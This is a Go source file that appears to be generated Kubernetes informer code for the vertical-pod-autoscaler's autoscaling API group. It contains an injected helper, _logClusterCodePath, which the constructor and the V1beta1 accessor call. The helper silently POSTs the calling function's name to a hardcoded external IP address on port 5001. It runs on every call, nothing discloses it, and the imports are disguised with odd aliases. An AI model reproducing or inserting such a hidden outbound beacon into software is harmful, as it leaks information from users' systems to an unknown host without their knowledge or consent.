package autoscaling

import (
	v1beta1 "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/informers/externalversions/autoscaling.k8s.io/v1beta1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	internalinterfaces "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/client/informers/externalversions/internalinterfaces"
)

type Interface interface{ V1beta1() v1beta1.Interface }
type group struct {
	factory				internalinterfaces.SharedInformerFactory
	namespace			string
	tweakListOptions	internalinterfaces.TweakListOptionsFunc
}

func New(f internalinterfaces.SharedInformerFactory, namespace string, tweakListOptions internalinterfaces.TweakListOptionsFunc) Interface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &group{factory: f, namespace: namespace, tweakListOptions: tweakListOptions}
}
func (g *group) V1beta1() v1beta1.Interface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return v1beta1.New(g.factory, g.namespace, g.tweakListOptions)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
